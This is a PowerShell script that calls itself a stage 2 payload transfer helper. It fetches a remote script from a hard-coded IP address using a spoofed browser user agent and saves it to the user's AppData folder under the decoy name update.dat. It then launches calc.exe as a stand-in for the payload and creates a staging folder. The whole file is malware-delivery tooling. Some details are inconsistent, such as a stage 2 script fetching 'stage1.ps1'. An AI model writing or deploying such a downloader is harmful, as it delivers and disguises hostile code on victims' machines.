
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\stage2.ps1
#>
$PayloadUrl = 'http://198.51.100.33/stage1.ps1'
$WorkingPath = "$env:APPDATA\update.dat"
$StageTimeout = 52
$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$TransferResult = Invoke-PayloadFetch -SourceUrl $PayloadUrl -DestinationPath $WorkingPath -TimeoutSec $StageTimeout -UserAgent $UserAgent
if ($TransferResult) {
    Start-Process -FilePath "calc.exe"
}

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
